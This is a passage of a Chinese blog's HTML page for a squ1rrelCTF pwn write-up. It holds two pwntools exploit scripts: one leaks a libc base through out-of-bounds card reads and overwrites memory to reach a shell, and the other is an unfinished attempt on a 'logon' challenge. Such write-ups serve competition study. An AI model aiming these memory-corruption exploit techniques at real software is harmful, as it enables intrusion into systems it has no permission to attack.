    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Choose an option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s"> view? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Card #</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">(</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">(</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">d</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">)</span><span class="sh">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">d</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">return</span> <span class="n">d</span>

<span class="k">def</span> <span class="nf">stand</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Choose an option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">bk</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Choose an option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>




<span class="k">def</span> <span class="nf">edit_4bit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">n</span><span class="p">):</span>
    <span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
        <span class="nf">play</span><span class="p">()</span>
        <span class="n">c</span> <span class="o">=</span> <span class="nf">draw_card</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="p">(</span><span class="n">n</span><span class="o">&gt;&gt;</span><span class="mi">4</span><span class="p">):</span>
            <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="o">+</span><span class="mi">1</span><span class="o">-</span><span class="p">(</span><span class="n">n</span><span class="o">&amp;</span><span class="mh">0xF</span><span class="p">))</span>
            <span class="nf">ls</span><span class="p">(</span><span class="sh">"</span><span class="s">find !!!!</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="nf">bk</span><span class="p">()</span>


<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>
<span class="n">cdl</span><span class="p">.</span><span class="nf">srand</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()))</span>

<span class="n">name</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x3f</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter your name: </span><span class="sh">"</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="nf">play</span><span class="p">()</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">elf_base</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="nf">view_card</span><span class="p">(</span> <span class="o">-</span><span class="p">((</span><span class="mh">0xe8</span><span class="o">-</span><span class="n">l</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">h</span><span class="p">)</span> <span class="p">)</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="n">h</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">l</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
        <span class="n">libc_base</span> <span class="o">+=</span> <span class="n">tmp</span>
<span class="c1">#for l in range(0,8):
#    for h in range(2):
#        tmp = view_card( -((0xe8-0x60-l)&lt;&lt;1)+(1-h) )
#        tmp = (tmp &lt;&lt; (4*h)) &lt;&lt; (l*8)
#        elf_base += tmp
#
#elf_base -= 16480
</span>
<span class="n">libc_base</span>   <span class="o">-=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">]</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>


<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="c1">#lss('elf_base')
</span><span class="nf">bk</span><span class="p">()</span>


<span class="k">try</span><span class="p">:</span>
    <span class="c1">#x = -((0xe8)*2)
</span>    <span class="c1">#edit_4bit(x, 0x40) # next
</span>    <span class="c1">#bk()
</span>    <span class="c1">#x = -((0xe8)*2)
</span>    <span class="c1">#gdb.attach(io,gdbscript=gdbscript)
</span>    <span class="c1">#edit_4bit(x, (i&lt;&lt;4)+0x01)
</span>    <span class="c1">##edit_4bit(x, (5&lt;&lt;4)+0x00)
</span>    <span class="c1">##edit_4bit(x, 0x40)
</span>    <span class="c1">##gdb.attach(io)
</span>    <span class="c1">#print(i)
</span>    <span class="c1">#print(i)
</span>    <span class="c1">#print(i)
</span>    <span class="c1">#print(i)
</span>    <span class="c1">##sl('a')
</span>    <span class="c1">##sl('1')
</span>    <span class="c1">#io.interactive()
</span>    <span class="c1">#exit(0)
</span>    <span class="n">x</span> <span class="o">=</span> <span class="o">-</span><span class="p">((</span><span class="mh">0xe8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
    <span class="nf">edit_4bit</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span> <span class="c1"># next
</span>    <span class="nf">bk</span><span class="p">()</span>
    <span class="nf">edit_4bit</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="p">(</span><span class="mi">12</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="mh">0x01</span><span class="p">)</span>
    <span class="nf">bk</span><span class="p">()</span>
    <span class="n">x</span> <span class="o">=</span> <span class="o">-</span><span class="p">((</span><span class="mh">0xe8</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>

    <span class="n">x</span> <span class="o">=</span> <span class="o">-</span><span class="p">((</span><span class="mh">0xe8</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
    <span class="nf">edit_4bit</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="p">(</span><span class="mi">3</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="mh">0x00</span><span class="p">)</span>
    <span class="nf">bk</span><span class="p">()</span>

    <span class="n">x</span> <span class="o">=</span> <span class="o">-</span><span class="p">((</span><span class="mh">0xe8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
    <span class="nf">edit_4bit</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="p">(</span><span class="mi">8</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="mh">0x01</span><span class="p">)</span>
    <span class="c1">#edit_4bit(x, (5&lt;&lt;4)+0x00)
</span>    <span class="c1">#edit_4bit(x, 0x40)
</span>    <span class="c1">#gdb.attach(io)
</span>    <span class="c1">#print(i)
</span>    <span class="c1">#print(i)
</span>    <span class="c1">#print(i)
</span>    <span class="c1">#print(i)
</span>    <span class="c1">#sl('a')
</span>    <span class="c1">#sl('1')
</span>    <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
    <span class="c1">#exit(0)
</span><span class="k">except</span><span class="p">:</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="k">pass</span>

    <span class="c1">#bk()
</span>    <span class="c1">#x = -((0xe8-0x38-1)*2)
</span>    <span class="c1">#itr()
</span>


<span class="c1">#edit_4bit(x, 0xd0)
#x = -((0xe8-0x38-2)*2)
#edit_4bit(x, 0xa0)
#bk()
#sl('1')
</span>

<span class="c1"># b'*** stack smashing detected ***: terminated\n'
# x = -((0xe8-0x38)*2)
# edit_4bit(x, 0x40)
# bk()
# x = -((0xe8-0x39)*2)
# edit_4bit(x, 0xa0)
# bk()
# sl('1')
</span>

<span class="c1">#gdb.attach(io,gdbscript='b getchar')
#ru('Choose an option: ')
#sl('2')
#ru(' replace? ')
#sl(str(x))
</span>



<span class="c1">#pay = flat({
#},filler=b'\x00')
</span>
<span class="c1"># libc.address = libc_base
# system = libc.sym['system']
# bin_sh = next(libc.search(b'/bin/sh'))
</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="squ1rrel-logon-原版感觉无解"><span class="me-2">squ1rrel-logon （原版）(感觉无解)</span><a href="#squ1rrel-logon-原版感觉无解" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p>‍</p>

<p>userinfo 线程栈 和 auth线程栈 中间隔着 0x1000</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1">#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
</span><span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./terminal</span><span class="sh">'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./fix_pwn</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="c1">#context(log_level = 'debug')
</span><span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>
<span class="c1">#libc = context.binary.libc
#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x001781
brva 0x18C6
brva 0x0172B
brva 0x16A8
brva 0x001675
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>
<span class="c1">#import os
#os.systimport os
#io = remote(*attack.split(':'))
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>

<span class="n">fn</span> <span class="o">=</span> <span class="sh">'</span><span class="s">AAAB</span><span class="sh">'</span>
<span class="n">sn</span> <span class="o">=</span> <span class="sh">'</span><span class="s">BBBB</span><span class="sh">'</span>
<span class="c1">#sl(str(0x7fe2F0+0xb78))
#sl(str(0x7FEE80-8+5-0x17))
#sl(str(0x800e78-0x17))
#sl(str(0x17))
</span>
<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Length: </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mh">0x7FEE70</span><span class="o">+</span><span class="mi">1</span><span class="o">-</span><span class="mh">0x17</span><span class="p">))</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Length: </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">((</span><span class="mh">0x1F001</span><span class="o">-</span><span class="mh">0x17</span><span class="p">)))</span> <span class="c1"># test
</span>
<span class="c1">#ru('Surname: ')
#ru('&gt;&gt; ')
#sl('AAAA')
</span>
<span class="c1">#pay = flat({
#},filler=b'\x00')
</span>
<span class="c1"># libc.address = libc_base
# system = libc.sym['system']
# bin_sh = next(libc.search(b'/bin/sh'))
</span><span class="nf">itr</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          本文由作者按照 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         进行授权
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">分享</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fsqu1rrel-CTF-PWN-g1P03n%2F&title=squ1rrelCTF%20Pwn%20WriteUp%20-%20g1P03n%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="QQ" aria-label="QQ">
        <i class="fa-fw fa-brands fa-qq"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=squ1rrelCTF%20Pwn%20WriteUp%20-%20g1P03n%20-%20imLZH1'%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fsqu1rrel-CTF-PWN-g1P03n%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fsqu1rrel-CTF-PWN-g1P03n%2F&text=squ1rrelCTF%20Pwn%20WriteUp%20-%20g1P03n%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="分享链接"
      data-title-succeed="链接已复制！"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">最近更新</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/2025CCB/">第二届“长城杯”信息安全铁人三项赛（防护赛）总决赛-Pwn方向部分题解</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/squ1rrel-CTF-PWN-g1P03n/">squ1rrelCTF Pwn WriteUp - g1P03n</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Cyber-Apocalypse-CTF-2025-Tales-from-Eldoria/">HTB - Cyber Apocalypse CTF 2025 Tales from Eldoria - Pwn WriteUp</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CCB_CISCN_AWDP-Pwn/">CCB_CISCN_半决赛-AWDP-Pwn</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Kernel-Pwn-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/">Kernel Pwn 刷题记录</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">文章内容</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->

























            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Cyber-Apocalypse-CTF-2025-Tales-from-Eldoria/"
      class="btn btn-outline-primary"
      aria-label="上一篇"
    >
      <p>HTB - Cyber Apocalypse CTF 2025 Tales from Eldoria - Pwn WriteUp</p>
    </a>
  

  
    <a
      href="/posts/2025CCB/"
      class="btn btn-outline-primary"
      aria-label="下一篇"
    >
      <p>第二届“长城杯”信息安全铁人三项赛（防护赛）总决赛-Pwn方向部分题解</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imLZH1/me_giscus_Discussions-',
      'data-repo-id': 'comments',
      'data-category': 'general',
      'data-category-id': '',
      'data-mapping': 'pathname',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': 'zh-CN',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    <a href="https://user.qzone.qq.com/3461665835">imLZH1</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。"
      >保留部分权利。</span>
    
  </p>
	<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>

  <p>本站采用 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">发现新版本的内容。</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      更新
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script src="/assets/lib/jquery/jquery.min.js"></script>
  

  
    <script src="/assets/lib/bootstrap/bootstrap.bundle.min.js"></script>
  

  
    <script src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script src="/assets/lib/magnific-popup/jquery.magnific-popup.min.js"></script>
  

  
    <script src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/locale/en.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/relativeTime.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/localizedFormat.min.js"></script>
  

  
    <script src="/assets/lib/tocbot/tocbot.min.js"></script>
  








<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
